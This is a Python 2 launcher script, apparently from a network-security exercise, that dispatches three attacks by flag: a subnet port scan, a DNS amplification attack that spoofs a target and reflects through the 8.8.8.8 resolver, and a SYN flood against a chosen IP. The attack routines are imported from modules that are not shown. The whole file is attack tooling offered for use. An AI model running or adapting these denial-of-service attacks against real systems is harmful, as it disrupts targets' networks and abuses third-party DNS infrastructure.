import os
import argparse
import socket
import struct
from ExrcUtils import *
from PortScanner import *
from DnsAmplification import DnsAmplificationAttack
from SynFlood import SynFloodAttack



def main():

	# Get the wanted Attack and params to use
	FuncParser = argparse.ArgumentParser(description='Muset call with root privilege!!! Choose Attack: IpScan = 1, DnsAmplification = 2, SynFlood = 3, Add ip and subnet')
	FuncParser.add_argument('-Attack','--Attack',action='store', help='Choose Attack', default='1')
	FuncParser.add_argument('-MyIP','--MyIP',action='store', help='Needed for IpScan and SynFlood. Set your ip address. inet(3) format', default="192.168.1.1")
	FuncParser.add_argument('-AttackedIP','--AttackedIP',action='store', help='Needed for synFlood and DnsAmplification. Set your attack machine ip address. inet(3) format', default="192.168.1.1")
	FuncParser.add_argument('-subnet','--subnet',action='store', help='We support only 255.255.255.0 in this version',default="255.255.255.0")
	args = FuncParser.parse_args()

	# if it is Ip Scan
	if (args.Attack == '1'):
		print 'Yai!'
		# Get the numeric value of the ip and subnet
		BinaryIP = GetBinaryIP(args.MyIP)
		BinaryMask = GetBinaryIP(args.subnet)

		# Check if value is valid
		if BinaryIP == 0:
			print("Ip is wrong, try again")
			return
		if (BinaryMask == 0 or args.subnet != '255.255.255.0'):
			print("Subnet is wrong, try again")
			return

		# Scan the wanted port
		PortScan(BinaryIP, BinaryMask)
	# If the attack is dns amplification
	elif (args.Attack == '2'):

		trgt_ip = GetBinaryIP(args.AttackedIP)
		if trgt_ip == 0:
			print("AttackedIP  is wrong, try again")
			return

		DnsAmplificationAttack(args.AttackedIP, os.getpid(), '8.8.8.8', 53, 'www.ynet.co.il')
	# if the attack is syn flood
	elif (args.Attack == '3'):
		# Get the numeric value of the ip and subnet
		MyIP = GetBinaryIP(args.MyIP)
		AttackedIP = GetBinaryIP(args.AttackedIP)

		if MyIP == 0:
			print("My Ip is wrong, try again")
			return
		if AttackedIP == 0:
			print("Attacked Ip is wrong, try again")
			return
		
		SynFloodAttack(args.MyIP, args.AttackedIP)


if __name__ == "__main__":
	main()

